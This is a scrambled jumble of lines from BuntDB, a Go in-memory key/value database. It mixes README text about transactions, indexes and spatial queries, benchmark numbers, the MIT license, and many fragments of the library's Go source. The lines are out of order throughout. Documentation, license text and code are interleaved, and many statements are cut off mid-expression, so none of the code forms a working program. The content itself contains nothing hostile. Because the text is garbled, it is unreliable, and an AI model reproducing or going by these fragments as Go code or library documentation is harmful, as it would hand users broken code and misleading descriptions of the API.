Now only items with keys that have the prefix 
inf 
- ACID semantics with locking [transactions](
", func(key, value string) bool {"
"{""name"":{""first"":""Melinda"",""last"":""Prichard""},""age"":44}"
- Embeddable with a [simple API](https://godoc.org/github.com/tidwall/buntdb)
"// 5: {""name"":{""first"":""Sam"",""last"":""Anderson""},""age"":51}"
ErrNotFound
 function:
A read/write transaction is used when you need to make changes to your data. There can only be one read/write transaction running at a time. So make sure you close it as soon as you are done with it.
SetConfig
Along with 
buntdb.Open()
"[-112.26 33.51],[-112.18 33.67]"
""", collate.IndexString(""FRENCH_NUM""))"
SPATIAL_INTERSECTS_400: 306951.15 operations per second
- Index fields inside [JSON](
Josh Baker [@tidwall](http://twitter.com/tidwall)
"// 1: {""name"":{""first"":""Tom"",""last"":""Johnson""},""age"":38}"
This is similar to a [multi column index](http://dev.mysql.com/doc/refman/5.7/en/multiple-column-indexes.html) in a traditional SQL database.
"db.CreateIndex(""last_name_age"", """
user:7:name Terri
user:7:age 16
- Option to evict old items with an [expiration](
"tx.Ascend(""names"", func(key, val string) bool {"
To get the value:
IndexFloat
"In this example we are creating a multi value index on ""name.last"" and ""age"":"
set key:2 value2
"[-117 30],[-112 36]"
Initially all data is stored in a single [B-tree](https://en.wikipedia.org/wiki/B-tree) with each item having one key and one value. All of these items are ordered by the key. This is great for quickly getting a value from a key or [iterating](
user:4:age 63
 which can be set to 
"BuntDB is a low-level, in-memory, key/value store in pure Go."
By default BuntDB executes an 
 defines the minimum size of the aof file before an automatic shrink can occur. Default is 32MB.
Order by age
" will be used to process the parameter, in this case it's "
To install:
 Delete while iterating
" is used by the background process to trigger a shrink of the aof file when the size of the file is larger than the percentage of the result of the previous shrunk file. For example, if this value is 100, and the last shrink process resulted in a 100mb file, then the new aof file must be 200mb before a shrink is triggered. Default is 100."
"[10 15 12],[20 25 18]"
ASCEND_100: 2268998.79 operations per second
package main
log.Fatal(err)
 Durability and fsync
EverySecond
 once every second on the [aof file](
 Read-only Transactions
indexes that are sorted by the specified language. This is similar to the [SQL COLLATE keyword](https://msdn.microsoft.com/en-us/library/ms174596.aspx) found in traditional databases.
"<a href=""https://travis-ci.org/tidwall/buntdb""><img src=""https://img.shields.io/travis/tidwall/buntdb.svg"
LonLat bounding box:
[3 8 2]
"tx.Set(""user:1:age"", ""49"", nil)"
// and use a comma to represent a decimal point.
fleet
LonLat point:
return nil
user:
multi-value-index)
err := db.View(func(tx 
json-indexes) documents
IndexUint
SPATIAL_INTERSECTS_100: 939491.47 operations per second
To create a spatial index use the 
 command
Set()
How fast is BuntDB
3D rectangle:
SET: 248500.33 operations per second
Now you can add various names:
"// 3: {""name"":{""first"":""Carol"",""last"":""Anderson""},""age"":52}"
"db.CreateIndex(""amount"", """
"style=flat-square"" alt=""Build Status""></a>"
 Contact
To set a value you must open a read/write transaction:
-inf
DescendEqual
set key:1 value3
Config.SyncPolicy
"buntdb.SetOptions{Expires:true, TTL:time.Second})"
"db.CreateIndex(""names"", """
"val, err := tx.Get(""mykey"")"
"    src=""logo.png"""
"All reads and writes must be performed from inside a transaction. BuntDB can have one write transaction opened at a time, but can have many concurrent read transactions. Each transaction maintains a stable view of the database. In other words, once a transaction has begun, the data for that transaction cannot be changed by other transactions."
"When a transaction fails, it will roll back, and revert all changes that occurred to the database during that transaction. There's a single return value that you can use to close the transaction. For read/write transactions, returning an error this way will force the transaction to roll back. When a read/write transaction succeeds all changes are persisted to disk."
"Min LatLon: ""33.51 -112.26"", Max LatLon: ""33.67 -112.18"""
[10 15]
 Iterating
" - fsync is managed by the operating system, less safe"
"db, err := buntdb.Open(""data.db"")"
Features
"LatLon: ""33.5123 -112.2693"""
 which stores and sorts all values. The second parameter is a pattern that is used to filter on keys. A 
mykey
"// 4: {""name"":{""first"":""Alan"",""last"":""Cooper""},""age"":28}"
user:0:name tom
ReadConfig
"fmt.Println(""Order by last name"")"
del key:2
 followed by 
"<a href=""https://goreportcard.com/report/github.com/tidwall/buntdb""><img src=""https://goreportcard.com/badge/github.com/tidwall/buntdb"
import (
err := db.Update(func(tx 
For example:
""", collate.IndexString(""FRENCH_CI""))"
" is a built-in function that converts rect strings to a format that the R-tree can use. It's easy to use this function out of the box, but you might find it better to create a custom one that renders from a different format, such as [Well-known text](https://en.wikipedia.org/wiki/Well-known_text) or [GeoJSON](http://geojson.org/)."
 by using 
GET: 4609604.74 operations per second
- Create [custom indexes](
""", buntdb.IndexJSON(""name.last""), buntdb.IndexJSON(""age""))"
// Output:
"style=flat-square"" alt=""GoDoc""></a>"
println(val)
Using the external [collate package](https://github.com/tidwall/collate) it's possible to create
2D rectangle:
"<p align=""center"">"
 Read/write Transactions
go get
if err := db.ReadConfig(
"tx.Set(""fleet:0:pos"", ""[-115.567 33.532]"", nil)"
buntdb.Desc
"tx.Set(""1"", "
data-expiration) TTL
Indexes can be created on individual fields inside JSON documents. BuntDB uses [GJSON](https://github.com/tidwall/gjson) under the hood.
"n"", val)"
"fmt.Printf(buf, ""%s %s"
// To sort case-insensitive in French.
To install this utility:
 turns off automatic background shrinking. Default is false.
IndexRect
"tx.Ascend(""ages"", func(key, val string) bool {"
 Data Expiration
", nil)"
. For example:
built-in-types) that are easy to get up 
"tx.Intersects(""points"", ""[-inf -inf 2],["
user:1:name Randi
"// 2: {""name"":{""first"":""Janet"",""last"":""Prichard""},""age"":47}"
append-only-file) format for persistence
It's also possible to open a database that does not persist to disk by using 
 Spatial Indexes
"Min XYZ: ""10x15x12"", Max XYZ: ""20x25x18"""
Infinity
AscendLessThan
user:2:name jane
AscendEqual
IndexInt
========
"To add some lon,lat points to the "
"n"", key, value)"
 object in the 
There is also 
"For example, let's say you want to create an index for ordering names:"
$ go get -u github.com/tidwall/buntdb
AutoShrinkDisabled
"fmt.Printf(""%s: %s"
"For example, you might have the following points ("
- [Collate i18n Indexes](
"tx.Set(""fleet:2:pos"", ""[-113.902 31.234]"", nil)"
"// To specify that numbers should sort numerically (""2"" < ""12"")"
iterating) of data
"tx.Set(""user:2:name"", ""jane"", nil)"
 between 2-4 by calling 
These are built-in types for indexing. You can choose to use these or create your own.
copies or substantial portions of the Software.
"this software and associated documentation files (the ""Software""), to deal in"
"the Software, and to permit persons to whom the Software is furnished to do so,"
Copyright (c) 2016 Josh Baker
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
language: go
t := time.NewTicker(time.Second)
 idx.less == nil {
// turn off persistence for pure in-memory
"Tx) AscendEqual(index, pivot string,"
tx.db.keys = tx.wc.rbkeys
// Close all files
// lock/unlock.
"ex:   true,"
// transactions can set and delete keys.
"func Desc(less func(a, b string) bool) func(a, b string) bool {"
tx.db.buf = (
"if _, ok := tx.wc.rollbackItems[key]"
 1024 
// readers and a single writer. Bunt is ideal for projects that need
"return tx.scan(false, false, true, index, pivot, """", iterator)"
"func IndexFloat(a, b string) bool {"
// The opt params may be used for additional functionality such as forcing
tx.wc.rollbackItems[key] = item
for dataln < n
1024 {
package buntdb
"// range [first, pivot), until iterator returns false."
"parts := make([]string, 0, 8)"
flushes = db.flushes
} else if a[i]
lastaofsz int               // the size of the last shrink aof size
// intialize new index
"return tx.Ascend("""", iterator)"
"rect func(item string) (min, max []float64)) error {"
tmpname := fname 
db.mu.Unlock()
"if _, err := tx.Delete(itm.key)"
// Multiple read-only transactions can be opened at the same time but there can
"err := tx.CreateSpatialIndex(name, pattern, rect)"
db.exps.Delete(pdbi)
// were performed on the transaction such as Set() and Delete().
// Remove it from the exipres tree.
32 > b[i] {
// matches on any one character.
"return tx.Descend("""", func(key, value string) bool {"
time.Sleep(time.Second / 4) // wait just a bit before starting
// got an eof but also data. this should be an unexpected eof.
for !done {
func Open(path string) (
var n int
return dbi.key < dbi2.key
tx.db.insertIntoDatabase(item)
"return """", false, ErrTxIterating"
rbexps 
"return gjson.Get(a, path).Less(gjson.Get(b, path), true)"
"if err := onExpiredSync(itm.key, itm.val, tx)"
"// Even though the item has been deleted, we still want to check"
// expires tree
item := 
DB) DropIndex(name string) error {
// Clear the db field to disable this transaction from future use.
// match where '
// as specified by the less() function of the defined index.
// Remove it from the rtree index.
"rect    func(item string) (min, max []float64) // rect from string function"
"dbItem{key: key, val: value}"
"name:    name,"
if !idx.match(item.key) {
"Tx) scan(desc, gt, lt bool, index, start, stop string,"
// An item with the same key did not previously exist. Let's
// the item to be evicted at a specified time. When the return value
"return r.min, r.max"
"return db.managed(true, fn)"
// percentage of the result of the previous shrunk file.
itemB.keyless = true
// There is support for up to 20 dimensions.
"buf = appendArray(buf, 3)"
tx.db.mu.Unlock()
txWriteContext{}
// finished reading the command
"db:       db,"
"// simple 2D points, it's the distance of the two 2D points squared."
// lock locks the database based on the transaction type.
 idx.rect == nil {
return ctx.rect(dbi.val)
"lessers []func(a, b string) bool,"
"Tx) AscendLessThan(index, pivot string,"
Tx) error {
// options are used to change various behaviors of the database.
 pdbi.opts.ex {
// does not exist or if the item has expired then ErrNotFound is returned.
// IndexBinary is a helper function that returns true if 'a' is less than 'b'.
"func IndexInt(a, b string) bool {"
type DB struct {
// Deprecated: Use Transactions
buf       []byte            // a buffer to write to
// Add new item to btree index.
DB) Close() error {
 !dbi.opts.ex {
tx.db.idxs = make(map[string]
onExpired(keys)
"// the range [lessOrEqual, greaterThan), until iterator returns false."
// Executing a manual commit or rollback from inside the function will result
// Uint() conversion function.
"return tx.createIndex(name, pattern, nil, rect, nil)"
// The item does not exists or has expired. Let's assume that
"min, max = idx.rect(bounds)"
"""strings"""
"// When a pattern is provided, the index will be populated with"
// This method is intended to be wrapped by Update and View
"if ctx.less(dbi2.val, dbi.val) {"
"return db.managed(false, fn)"
// Point is a helper function that converts a series of float64s
// An error will be returned if the tx is closed or the index is not found.
// Expires indicates that the Set() key-value will expire
"Tx) DescendGreaterThan(index, pivot string,"
"exat: now.Add(dur),"
"return db, nil"
int(float64(db.lastaofsz)
// All transactions must be closed before closing the database.
1] != '
DB) Update(fn func(tx 
"return tx.Ascend("""", func(key, value string) bool {"
"// b is uppercase, convert b to lowercase"
idx.rtr.KNN(
idx.rebuild()
// matching on keys when setting key/values.
// we use nil to indicate that the index should be removed upon rollback.
if opts.Expires {
"func Rect(min, max []float64) string {"
"ErrInvalidOperation = errors.New(""invalid operation"")"
"dbItem) Rect(ctx interface{}) (min, max []float64) {"
"// the range [pivot, last], until iterator returns false."
// TTL is how much time the key-value will exist in the database
"var min, max []float64"
// contains information about changes to the database.
"// the range [last, pivot), until iterator returns false."
flushes != db.flushes {
// TTL to an absolute time and bind it to the item.
} else if b[i] >= 'A' 
"iterator func(key, value string) bool) error {"
"var maxTime = time.Unix(1<<63-62135596801, 999999999)"
// backgroundManager runs continuously in the background and performs various
tx.wc.commitItems[key] = nil
// This is the recommended setting.
 (len(tx.wc.commitItems) > 0 
// deleteFromDatabase removes and item from the database and indexes. The input
// Ascend calls the iterator for every item in the database within the range
// it allows for additional options.
"Tx) AscendRange(index, greaterOrEqual, lessThan string,"
dbItem{
// unlock the database for more transactions.
// ErrShrinkInProcess is returned when a shrink operation is in-process.
var expired []
// DescendKeys allows for iterating through keys based on the specified pattern.
db.exps.ReplaceOrInsert(item)
// The lt param indicates that there is a lessThan limit.
dbItem{key: start}
// Begin opens a new transaction.
Tx) Commit() error {
index) clearCopy() 
"return item.val, nil"
"less:    idx.less,"
if idx.less != nil {
"idx, ok := tx.db.idxs[index]"
"idx.btr = btree.New(btreeDegrees, idx)"
// ReadConfig returns the database configuration.
// An error will occur if an index with the same name already exists.
"Tx) CreateIndexOptions(name, pattern string,"
const (
"ib, _ := strconv.ParseUint(b, 10, 64)"
"// set the center param to false, which uses the box dist calc."
// The rollback func does the heavy lifting.
 parts[0][1] == 'S') 
// scan iterates through a specified index and calls user-defined iterator
if onExpired != nil 
"return """", ErrTxClosed"
"delete(tx.db.idxs, name)"
dbItem) expiresAt() time.Time {
var err error
// execute the scan on the underlying tree.
"// for ordering, inserting, and deleting items from a b-tree. It's important"
"for _, itm := range expired {"
// is represented by the rect string. This string will be processed by the
for range t.C {
// writeSetTo writes an item as a single DEL record to the a bufio Writer.
// to the caller of View().
// If the file does not exist then it will be created automatically.
// Never is used to disable syncing data to disk.
switch config.SyncPolicy {
defer db.mu.RUnlock()
// Let's release all references to nil. This will help both with debugging
"panic(""managed tx commit not allowed"")"
// from a rect.
if len(parts) != 2 {
32 {
if opts != nil {
// timeed-out item is the explicit responsibility of this callback.
"tx.db.exps = btree.New(btreeDegrees, "
 len(buf) > 64
iter := func(item btree.Item) bool {
"if index == """" {"
"// In the event that an error is returned, the transaction will be rolled back."
"ib, _ := strconv.ParseInt(b, 10, 64)"
"ErrIndexExists = errors.New(""index exists"")"
} else if item.opts == nil 
if key != pivot {
"// has expired then ErrNotFound is returned. If ignoreExpired is true, then"
tx.unlock()
// A previous item already exists in the database. Let's create a
"} else if less(value, pivot) {"
"writable: writable,"
// before being evicted. The Expires field must also be set to true.
"ErrTxClosed = errors.New(""tx closed"")"
"return tx.scan(true, true, false, index, pivot, """", iterator)"
// Get returns a value for a key. If the item does not exist or if the item
// doing ad-hoc compares inside a transaction.
"tr.AscendGreaterOrEqual(itemA, iter)"
// can be snapshotted by simply copying the database file.
 err != nil {
// For commits we simply assign the item to the map. We use this map to
index{
idx.rtr.Insert(dbi)
"Tx) GetRect(index string) (func(s string) (min, max []float64),"
// is a disaster.
"if pattern == """
"Tx) CreateSpatialIndexOptions(name, pattern string,"
if prev != nil {
"parts = append(parts, string(data[:n]))"
case 
"return nil, ErrTxClosed"
"var less func(a, b string) bool"
ex := dbi.opts.exat.Sub(time.Now()) / time.Second
"return tx, nil"
if len(line) < 5 
// ErrInvalidSyncPolicy is returned for an invalid SyncPolicy value.
itemA.keyless = true
dbi2 := item.(
tx.db.mu.RLock()
idx.rtr = rtree.New(idx)
type SetOptions struct {
// Add new item to rtree index.
// There's some more work to do by appending the new line from the aof
if dbi2.expiresAt().After(dbi.expiresAt()) {
"var onExpiredSync func(key, value string, tx "
// rebuild rebuilds the index
 i < len(line)-2
type txWriteContext struct {
done := false
// Nearby searches for rectangle items that are nearby a target rect.
// Slow. Very safe.
// The default is EverySecond.
DB{}
"err := tx.CreateIndex(name, pattern, less...)"
"dbItem{key: pivot},"
"// The database was opened with "":memory:"" as the path."
keyless  bool        // keyless item for scanning
"// replaced is true, then the operaton replaced an existing item whose"
tx.db.buf = item.writeSetTo(tx.db.buf)
"return tx.CreateSpatialIndex(name, pattern, rect)"
"return tx.AscendGreaterOrEqual("""", min, func(key, value string) bool {"
// not an r-tree index. just return nil
// managed calls a block of code that is fully contained in a transaction.
os.File          // the underlying file
var buf []byte
"for key, item := range tx.wc.rollbackItems {"
parts = parts[:0]
pattern = strings.ToLower(pattern)
case 0:
idxs      map[string]
"// modTime is the modified time of the reader, should be no greater than"
// we are going to read items in as chunks as to not hold up the database
// A negative duration will be returned for items that do not have an
"tx, err = db.Begin(writable)"
pivot = dbi.key
// expired evaluates id the item has expired. This will always return false when
 parts[0][2] == 'L') {
// expired items.
32 < b[i] {
// rollback.
"SetOptions) (previousValue string,"
"// both are uppercase, do nothing"
tx.wc.rollbackItems[key] = nil
if tx.db.persist {
// this is all that is needed to delete an index.
"return tx.scan(false, false, false, index, """", """", iterator)"
// DEL
if nidx.less != nil {
 dbi.opts.ex 
db.mu.RLock()
"return tx.CreateIndex(name, pattern, less...)"
// GetRect returns the rect function for an index. This is handy for
"OnExpiredSync func(key, value string, tx "
if line[0] != '$' {
if dur > 0 {
db.lastaofsz = int(pos)
Tx) DropIndex(name string) error {
if data[n] != '
"// one dimensional rectangle, and a length of 4 is a four dimension rectangle."
Tx) error) error {
// read-only or read/write. Read-only transactions can be used for retrieving
btr     
_ = db.file.Sync()
// empty index means we will use the keys tree.
// SET
"previousValue, replaced = prev.val, true"
 ok {
db.exps.AscendLessThan(
// IndexJSONCaseSensitive provides for the ability to create an index on
err := db.Update(func(tx 
"if _, err := io.Copy(f, aof)"
32620397
db.closed = true
// Tx represents a transaction on the database. This transaction can either be
// that the entry should be deleted on rollback. When the value is
// not expire 
return db.Update(func(tx 
_ = tx.db.file.Sync()
"os.O_RDWR, 0666)"
"// When the field is a string, the comparison will be case-insensitive."
var shrink bool
tx.lock()
if gt 
DB) insertIntoDatabase(item 
// DB represents a collection of key-value pairs that persist on disk.
"Tx) TTL(key string) (time.Duration, error) {"
"func Match(key, pattern string) bool {"
// Note that this can only work for fully in-memory databases opened with
nidx.rtr = rtree.New(nidx)
// Float() conversion function.
// Intersects searches for rectangle items that intersect a target rect.
Expires bool
// The faster and less safe method.
// IndexInt is a helper function that returns true if 'a' is less than 'b'.
Tx) lock() {
return buf
// ErrIndexExists is returned when an index already exists in the database.
dbItem{key: stop}
// The IndexRect is a default function that can be used for the rect
"return Rect(coords, coords)"
"DB) ReplaceIndex(name, pattern string,"
if idx.rtr != nil {
idx.rtr.Insert(item)
// write the entry to disk.
"ex, err := strconv.ParseInt(parts[4], 10, 64)"
"// [first, last], until iterator returns false."
tx.wc.rbidxs = tx.db.idxs
"// execute a disk sync, if needed"
"tr.DescendLessOrEqual(itemA, iter)"
CaseInsensitiveKeyMatching bool
"// the range [greaterOrEqual, lessThan), until iterator returns false."
"return tx.createIndex(name, pattern, less, nil, nil)"
if db.persist {
 parts[0][1] == 'F') 
func (db 
"// close on error, ignore close error"
// The less function compares if string 'a' is less than string 'b'.
// wrap a rtree specific iterator around the user-defined iterator.
// dbItemOpts holds various meta information about an item.
if nidx.rect != nil {
"Tx) DescendLessOrEqual(index, pivot string,"
tx.db.buf = tx.db.buf[:0]
"return """", ErrNotFound"
// writable transactions have a writeContext object that
// the found value will be returned even if it is expired.
idx.rtr.Search(
"return func(a, b string) bool { return less(b, a) }"
"tx.db.keys = btree.New(btreeDegrees, nil)"
"// When an index is not nil, we will need to rebuilt that index"
// ErrInvalidOperation is returned when an operation cannot be completed.
dbItem // details for rolling back tx.
"return tx.DescendLessOrEqual(index, pivot, func(key, value string) bool {"
// first we should read the number of parts that the of the command
dbItem // details for committing tx.
// Thus min[0] must be less-than-or-equal-to max[0].
"DB) readLoad(rd io.Reader, modTime time.Time) error {"
func Point(coords ...float64) string {
"buf = append(buf, '$')"
"// an empty name index is designated for the main ""keys"" tree."
// The specified index must have been created by AddIndex() and the target
// IndexJSON provides for the ability to create an index on any JSON field.
"rect{min, max}, false, iter)"
// SetOptions represents options that may be included with the Set() command.
// to generate a rect from a string.
"opts:    sopts,"
 (item.expired() 
"return nil, err"
"data = make([]byte, dataln)"
exps      
return ia < ib
"Tx) Delete(key string) (val string, err error) {"
// less function to handle the content format and comparison.
"return gjson.Get(a, path).Less(gjson.Get(b, path), false)"
return false
type rect struct {
// OnExpiredSync will be called inside the same transaction that is performing
 lt {
} else if (parts[0][0] == 'd' 
exat time.Time // when does this item expire
 i < n
"less, err = tx.GetLess(index)"
// This compares the raw binary of the string.
if item.expired() {
Tx) unlock() {
dataln := len(data)
"nidx.btr = btree.New(btreeDegrees, nidx)"
// expiration.
"buf = appendArray(buf, 5)"
// EverySecond is used to sync data to disk every second.
"opts:    idx.opts,"
sort.Strings(names)
// We're wrapping this in a function to get the benefit of a defered
"n""...)"
// create a compound less function.
type dbItemOpts struct {
// This compares uint64s that are added to the database using the
if writable {
"ErrTxIterating = errors.New(""tx is iterating"")"
 line[i] > '9' {
// doing ad-hoc searches inside a transaction.
tx.funcd = false
"return match.Match(key, pattern)"
// SetConfig updates the database configuration.
if len(buf) > 1024
keys      
return func() error {
"r := grect.Rect{Min: min, Max: max}"
"less:    less,"
// createIndex is called by CreateIndex() and CreateSpatialIndex()
if shrink {
return r.String()
// Open opens a database at the provided path.
// that has already been committed or rolled back.
 key[i] <= 'Z' {
// for err is nil the operation succeeded. When the return value of
db.deleteFromDatabase(
tx.db.deleteFromDatabase(
maxTime
type IndexOptions struct {
return ErrTxNotWritable
if desc {
"idx, ok := tx.db.idxs[name]"
// if it has expired. An expired item should not be returned.
"// will not be called. If this callback is present, then the deletion of the"
less = lessers[0]
// Indexes returns a list of index names.
// Only a writable transaction can be used for this operation.
// resize the read buffer
// Remove it from the btree index.
// The dist param is the distance of the bounding boxes. In the case of
"// clearCopy creates a copy of the index, but with an empty dataset."
// Any failures below here is really bad. So just panic.
"""time"""
 b[i] <= 'Z' {
// delete from the map.
// This is a case-insensitive comparison. Use the IndexBinary() for comparing
"""github.com/tidwall/gjson"""
// always clear out the commits
if item == nil {
// we must return the previous item to the caller.
// TTL returns the remaining time-to-live for an item.
"db:      idx.db,"
"strings.ToLower(parts[0]) == ""flushdb"" {"
dbItemOpts{
tx.wc.commitItems = make(map[string]
var pdbi 
// Just copy all of the new commands that have occurred since we
// ReplaceSpatialIndex builds a new index and populates it with items.
if tx.wc != nil {
nflushdb
 !ignore) {
err = fn(tx)
} else if lt {
"""bufio"""
prc)
func (r 
DB) View(fn func(tx 
"buf = appendBulkString(buf, ""del"")"
 set to true.
 parts[0][1] == 'D') 
index  // details for dropped indexes.
// any JSON field.
ex   bool      // does this item expire
// keys that match the specified pattern. This is a very simple pattern
// same key.
"if _, err = io.ReadFull(r, data[:n"
opts: 
// started the shrink process.
"return 0, ErrTxClosed"
txWriteContext // context for writable transactions.
if !ok {
tr = tx.db.keys
"Tx) AscendKeys(pattern string,"
"db.keys = btree.New(btreeDegrees, nil)"
key = strings.ToLower(key)
// hardcoding 0666 as the default mode.
var err = db.View(func(tx 
dbItem) expired() bool {
if len(line) > 0 {
err := tx.DropIndex(name)
// ErrPersistenceActive is returned when post-loading data from an database
// store the index in the rollback map.
"Tx) Set(key, value string, opts "
done = false
tx.wc.rbkeys = tx.db.keys
item := tx.db.get(key)
Tx) rollbackInner() {
// log entries. This operation does not block the database.
// ErrTxIterating is returned when Set or Delete are called while iterating.
tx.db.exps = tx.wc.rbexps
ignore = ignoreExpired[0]
// IndexRect is a helper function that converts string to a rect.
"// cannot drop the default ""keys"" index"
return item.(
"if lessers[i](b, a) {"
db.config = config
// of a rect. IndexRect() is the reverse function and can be used
// Rect converts a string to a rectangle.
if len(data) < n
// We are going to open a new version of the aof file so that we do
error) {
 and Descend
wc       
SyncPolicy SyncPolicy
"ia, _ := strconv.ParseFloat(a, 64)"
// for too long.
// Always is used to sync data after every write to disk.
"Tx) CreateSpatialIndex(name, pattern string,"
return ErrInvalidOperation
// When a non-nil error is returned from the function that error will be return
tr = idx.btr
// // wrap a rtree specific iterator around the user-defined iterator.
if tx.db == nil {
dbItem{val: start}
OnExpired func(keys []string)
 line[len(line)-2] == '
if err := db.file.Close()
return ErrPersistenceActive
dbItem))
"} else if less(pivot, value) {"
db      
"return tx.AscendGreaterOrEqual(index, pivot, func(key, value string) bool {"
// the current time.Now().
file      
// This compares float64s that are added to the database using the
// we need to backup the live data in case of a rollback.
onExpiredSync = db.config.OnExpiredSync
"aof, err := os.Open(fname)"
// It returns a helper function used by CreateIndex.
"return idx.rect, nil"
// TTL stands for Time-To-Live.
"}, func(item btree.Item) bool {"
if key > max {
if line[1] < '0' 
"Tx) Intersects(index, bounds string,"
"""sync"""
"// It persists to disk, is ACID compliant, and uses locking for multiple"
// genreate a less function
// no less function
rtr     
"// The start and stop params are the greaterThan, lessThan limits. For"
"db.file, err = os.OpenFile(fname, os.O_CREATE"
"Tx) Nearby(index, bounds string,"
"// There is no persistence, and no need to do anything here."
opts 
exmgr     bool              // indicates that expires manager is running.
// insertIntoDatabase performs inserts an item in to the database and updates
// create some limit items
"DB) managed(writable bool, fn func(tx "
tx.wc.rollbackItems[key] = prev
item.opts = 
"dbItemOpts{ex: true, exat: time.Now()},"
// a shrink is triggered.
tx.db.idxs[name] = idx.clearCopy()
"return nil, ErrDatabaseClosed"
// only be one read/write transaction at a time. Attempting to open a read/write
db := 
onExpired = db.config.OnExpired
" "".tmp"""
// read the number of bytes of the part.
"Tx) createIndex(name string, pattern string,"
"fi, err := db.file.Stat()"
continue
// GetLess returns the less function for an index. This is handy for
// initialize trees
"db.exps = btree.New(btreeDegrees, "
EverySecond = 1
idx.db.keys.Ascend(func(item btree.Item) bool {
if err != ErrNotFound {
DB) Save(wr io.Writer) error {
"func IndexJSON(path string) func(a, b string) bool {"
tx.wc.itercount--
 i < len(lessers)-1
if less == nil {
// check if an index with that name already exists.
"return tx.scan(false, true, false, index, pivot, """", iterator)"
tx.wc.commitItems[key] = item
// that the strings may be textual or binary. It's up to the provided
 time.Second) - now.Sub(modTime)
"// IndexString, IndexBinary, etc."
"// a dependable database, and favor speed over data size."
"// all indexes. If a previous item with the same key already exists, that item"
"// item must only have the key field specified thus """
// CreateSpatialIndexOptions is the same as CreateSpatialIndex except that
tx.db.mu.Lock()
// It allows for indexes to create custom ordering. It's possible
// the deletion of expired items. If OnExpired is present then this callback
flushes   int               // a count of the number of disk flushes
// from a read-only transaction.
} else if a[i] > b[i]
Tx) error
if tx.wc.rbkeys == nil {
"return r.Min, r.Max"
// start the background manager.
"tr.DescendGreaterThan(itemA, iter)"
rtree.RTree                           // contains the items
"ErrShrinkInProcess = errors.New(""shrink is in-process"")"
 !db.config.AutoShrinkDisabled {
"AutoShrinkPercentage: 100,"
if item == nil 
"// empty string for the index means to scan the keys, not the values."
"f, err := os.Create(tmpname)"
} else if !tx.writable {
if idx == nil {
"func IndexRect(a string) (min, max []float64) {"
// readLoad reads from the reader and loads commands into the database.
 onExpiredSync == nil {
tx.db.idxs[name] = idx
"return """", false, ErrTxClosed"
"return names, nil"
defer db.mu.Unlock()
// We reached this far so all of the items have been written to a new tmp
dbItemOpts // optional meta information
// Increment the number of flushes. The background syncing uses this.
index // the index trees.
// The expires b-tree formula
if idx != nil {
"""errors"""
// initialize with empty trees
if err := db.load()
return io.ErrUnexpectedEOF
"return """", false, ErrTxNotWritable"
return len(a) < len(b)
"// This value can be Never, EverySecond, or Always."
// same bounds function that was passed to the CreateSpatialIndex() function.
"ErrInvalid = errors.New(""invalid database"")"
"// 'Delete' method reports ""not found"" for"
"return tx.scan(true, false, true, index, pivot, """", iterator)"
} else if tx.wc.itercount > 0 {
btree.BTree      // a tree of items ordered by expiration
// Rollback closes the transaction and reverts all mutable operations that
"db.persist = path != "":memory:"""
config = db.config
 db.config.SyncPolicy == EverySecond 
// late usage panics and it provides a hint to the garbage collector
for {
item := db.keys.Get(
"pos, err := db.file.Seek(0, 2)"
db.keys.AscendGreaterOrEqual(
// rolled back and the that error will be return to the caller of Update().
return true
} else if (parts[0][0] == 'f' 
"return match.Match(key, idx.pattern)"
"// Open("":memory:"")."
"false, true, true, index, greaterOrEqual, lessThan, iterator,"
"dbItem{key: parts[1], val: parts[2]})"
if err == ErrDatabaseClosed {
itercount       int                // stack of iterators
"Tx) GetLess(index string) (func(a, b string) bool, error) {"
var tr 
idx := 
// index should be rebuilt upon rollback.
"name:    idx.name,"
 methods.
// AscendEqual calls the iterator for every item in the database that equals
"keys := make([]string, 0, 32)"
// Flushing the buffer only once per transaction.
return ErrTxIterating
// Match returns true if the specified key matches the pattern. This is a very
// the endpos is used to return to the end of the file when we are
// Package buntdb implements a low-level in-memory key/value store in pure Go.
return nidx
// iterate through all keys and fill the index
AutoShrinkMinSize:    32 
"dbItem) Less(item btree.Item, ctx interface{}) bool {"
"if lessers[i](a, b) {"
// Intersects method.
 !item.opts.ex {
// ErrInvalid is returned when the database file is an invalid format.
"rect:    rect,"
DB) Shrink() error {
DB) get(key string) 
itemB = 
// Each committed record is written to disk
// Len returns the number of items in the database
// convert the string number to and int
// values for keys and iterating through keys and values. Read/write
tx.db.mu.RUnlock()
"func IndexJSONCaseSensitive(path string) func(a, b string) bool {"
switch ctx := ctx.(type) {
var (
// rollback entry with the item as the value. We need to check the
// IndexString is a helper function that return true if 'a' is less than 'b'.
"if !iterator(key, value) {"
"names := make([]string, 0, len(tx.db.idxs))"
"pattern: pattern,"
 is used.
"buf = append(buf, strconv.FormatInt(int64(len(s)), 10)...)"
// DescendEqual calls the iterator for every item in the database that equals
var onExpired func([]string)
// SyncPolicy represents how often data is synced to disk.
"if _, err := f.Write(buf)"
// a shrink of the aof file when the size of the file is larger than the
idx.btr.ReplaceOrInsert(dbi)
// Everything went well. Lets Commit()
tx.db.idxs = tx.wc.rbidxs
" 1024,"
"iter := func(item rtree.Item, dist float64) bool {"
dur := (time.Duration(ex) 
// load the database from disk
"ia, _ := strconv.ParseInt(a, 10, 64)"
"buf = appendBulkString(buf, dbi.val)"
tx.rollbackInner()
// MaxTime from http://stackoverflow.com/questions/25065055
Never SyncPolicy = 0
r' {
"return """", ErrTxIterating"
"// When the field is a string, the comparison will be case-sensitive."
if aofsz > db.config.AutoShrinkMinSize {
"tr.AscendLessThan(itemA, iter)"
buf = buf[:0]
DB) SetConfig(config Config) error {
// value will be returned through the previousValue variable.
"tr.DescendRange(itemA, itemB, iter)"
"// does not match the pattern, conintue"
"// The item exists in the tree, but has expired. Let's assume that"
// create a rollback entry if there has not been a deleteAll call.
